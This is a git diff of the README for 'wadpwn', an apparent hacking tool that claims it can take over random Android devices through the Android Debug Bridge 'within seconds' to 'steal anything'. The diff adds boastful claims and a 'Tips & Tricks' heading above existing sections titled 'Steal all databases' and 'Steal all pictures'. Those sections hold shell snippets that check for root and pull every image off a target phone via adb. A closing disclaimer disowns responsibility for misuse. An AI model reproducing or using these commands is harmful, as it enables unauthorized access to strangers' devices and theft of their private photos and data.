@@ -1,10 +1,10 @@
-# wadbpwn
+# wadpwn
 
-Hack a random android device with 100% guarantee to succeed within 1 second.
+**It's true** - We can takeover a  device within seconds and get a proxy or steal anything or whatever!
 
-![Screenshot](https://nr1.nu/archive/wadbpwn/wadbpwn.gif)
+Hack random android device with 100% guarantee to succeed within 1 second.
 
-![Download wadpwn](https://pastebin.com/DtFSMBsF)
+![wadpwn](https://user-images.githubusercontent.com/26827453/176798498-2e017de5-6bb4-4b8b-a5b1-e86ffd438276.gif)
 
 ### Get Started On Linux/MacOSX
  
@@ -23,6 +23,9 @@ Hack a random android device with 100% guarantee to succeed within 1 second.
 
     Install any linux distro from microsoft store and run commands above..
 
+
+## Tips & Tricks made by wuseman
+
 ### Steal all databases from the device ( require root )
 
     which su &> /dev/null
@@ -34,8 +37,7 @@ Hack a random android device with 100% guarantee to succeed within 1 second.
     fi
 
 ### Steal all pictures: 
-
-A simple example: 
+##### A simple example: 
 
     PICS="$(adb shell 'su -c find / \( -name '*.png' -name '*.jpg*' \)')"
     for pictures in $PICS; do
@@ -60,9 +62,18 @@ A simple example:
 
 - Android Debug Bridge (adb) - Find more info about _adb_ [here](https://developer.android.com/studio/command-line/adb)
 
-### Author: 
+## Changelog
+
+[Versions changelog](CHANGELOG.md).
+
+## Authors: 
 
 * **wuseman <wuseman@nr1.nu\>** 
+
+## License
+
+This project is licensed under the GNU General Public License v3.0 - see the [LICENSE.md](LICENSE.md) file for details
+
 
 ### Contact
 
@@ -75,4 +86,3 @@ A simple example:
   wuseman cannot be held as responsible for users actions regardless of what damage a user can do. All users that  gathering information or data via wadbpwn is 100% responsible for their own actions, wadbpwn has been developed for a legal purpose.
 
 
- 
